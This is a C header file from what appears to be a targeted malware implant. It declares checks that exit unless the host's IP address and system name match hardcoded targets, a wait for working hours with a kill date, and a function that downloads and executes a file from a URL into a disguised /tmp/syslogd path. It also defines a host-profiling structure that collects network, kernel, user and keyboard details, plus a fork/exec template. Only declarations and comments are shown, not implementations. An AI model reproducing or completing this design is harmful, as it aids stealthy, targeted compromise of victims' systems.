/*  File: valHelper.h
*   Author: Nunyabeeswax
*   Date: 6/7/2021
*   Description: 
*               - Declares auxilliary functions used in the validator program for various tasks.
*               - Contains includes used specifically by the validator.
*/

#include <netdb.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <time.h>
#include "../buildAndConfig/functionality.h"

/* ======== Validating ======= */

// exits if VALID_IP macro is not the hosts's actual ip address. Does nothing otherwise
void val_IP();

//  exits if VALID_SYSNAME macro is not the hosts's actual ip address. Does nothing otherwise
void val_SysName();

// Called after making sure it is a target machine with above functions. Sleeps until WORK_START_T < localtime < WORK_END_T
// Exits in failure if current date is after the END_DATE
void val_time();

// downloads a file at the specified url to /tmp/syslogd/<file>. Returns 0 if succesful, 1 otherwise.
int dwnldAndExecFile(char* url);


/*======== Profiling =======  TODO */

// Struct used to create a detailed profile of the host machine
struct Profile{
    char* kernel;               // Kernel (OS)
    char* kernel_rel;           // Kernel Release
    char* kernel_v;             // Kernel Version
    char* hardware;             // Machine Hardware/Architecture
    char* ldd;                  // glibc: ldd --version
    char* ip4;                  // IPv4 Address: ipaddr
    char* ip6;                  // IPv6 Address: 
    char* interface;            // IP Interface Name
    char* macAddr;              // MAC Address
    char* gatewayAddr;          // GatewayRouterAddr: "ip -j route"
    /*
    [{"dst":"default","gateway":"33.33.33.1","dev":"eth0","protocol":"dhcp","metric":100,"flags":[]},{"dst":"33.33.33.0/24","dev":"eth0","protocol":"kernel","scope":"link","prefsrc":"33.33.33.6","metric":100,"flags":[]}]
    1. Split up by 1st '}'
        [{"dst":"default","gateway":"33.33.33.1","dev":"eth0","protocol":"dhcp","metric":100,"flags":[]
    2. Split up by ',' --> json
        "dst":"default" , "gateway":"33.33.33.1", ..... etc
    3. Split up by ':' --> key_val
        "dst", "default"
        if(key_val[0]) == "gateway"
            continue to 4
        else
            keep parsing json obj
    4. key_val[1] = Profile.gatewayAddr
   */
    char* username;             // Device Name: id
    int uid;                    // User ID
    int gid;                    // Group ID
    char* keyboard;             // Keyboard Type: localectl status
};

// returns a Profile with NAN/-1 for invalid responses
struct Profile* getProfile();

// returns a string with a bunch of profile info. User must free() the returned str when done.
char* strProfile();


/* ======== General ======= */

// For debugging. Calls execCommand(), prints it, and frees the memory
void printCmdResults(char* command);


/* Bare bones forking template
int pid = fork();

switch (pid) {
	case -1: 
    #ifdef DEBUG
	    printf("fork() failed!");
    #endif
	    return; // end the case (failure)
	case 0: // child process
	    break;
	default: // parent process
	    // wait(NULL); //can wait on the pid if you want
	    return;
}
// only child gets this far

execv("prog",args);
#ifdef DEBUG
printf("Strange return from execvp() !\n");
#endif 
exit (0);
*/
